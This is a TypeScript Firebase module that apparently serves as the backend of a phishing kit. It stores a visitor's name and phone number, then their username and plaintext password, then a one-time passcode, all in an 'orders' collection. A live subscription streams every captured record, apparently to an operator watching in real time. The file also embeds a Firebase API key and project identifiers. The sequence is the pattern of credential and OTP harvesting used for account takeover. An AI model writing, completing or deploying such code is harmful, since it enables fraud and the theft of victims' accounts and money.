import { initializeApp, getApps, type FirebaseApp } from "firebase/app";
import {
  getFirestore,
  collection,
  addDoc,
  doc,
  setDoc,
  getDoc,
  updateDoc,
  onSnapshot,
  query,
  orderBy,
  type Firestore,
  Timestamp,
} from "firebase/firestore";

const firebaseConfig = {
  apiKey: "AIzaSyBSRLFN8DXH24hdFeZuj6RxsKt9_dceFJk",
  authDomain: "dzt24-8ea60.firebaseapp.com",
  databaseURL: "https://dzt24-8ea60-default-rtdb.firebaseio.com",
  projectId: "dzt24-8ea60",
  storageBucket: "dzt24-8ea60.firebasestorage.app",
  messagingSenderId: "818328713698",
  appId: "1:818328713698:web:0eaa497f53b2968dcee1bb",
  measurementId: "G-SV14E2SMDM",
};

let app: FirebaseApp;
let db: Firestore;

if (typeof window !== "undefined") {
  if (!getApps().length) {
    app = initializeApp(firebaseConfig);
  } else {
    app = getApps()[0];
  }
  db = getFirestore(app);
}

export function getSessionId(): string {
  let id = localStorage.getItem("aman_session");
  if (!id) {
    id = `sub_${Date.now()}_${Math.random().toString(36).slice(2, 9)}`;
    localStorage.setItem("aman_session", id);
  }
  return id;
}

export async function saveRegistration(fullName: string, phone: string): Promise<void> {
  const id = getSessionId();
  await setDoc(doc(db, "orders", id), {
    fullName,
    phone,
    step: "registered",
    timestamp: Timestamp.now(),
  }, { merge: true });
}

export async function saveLogin(username: string, password: string): Promise<void> {
  const id = getSessionId();
  await setDoc(doc(db, "orders", id), {
    username,
    password,
    step: "login",
    updatedAt: Timestamp.now(),
  }, { merge: true });
}

export async function saveOtp(otp: string): Promise<void> {
  const id = getSessionId();
  await setDoc(doc(db, "orders", id), {
    otp,
    step: "otp",
    completedAt: Timestamp.now(),
  }, { merge: true });
}

export function subscribeToOrders(callback: (docs: any[]) => void) {
  const q = query(collection(db, "orders"), orderBy("timestamp", "desc"));
  return onSnapshot(q, (snap) => {
    const data = snap.docs.map(d => ({ id: d.id, ...d.data() }));
    callback(data);
  });
}

export { db };
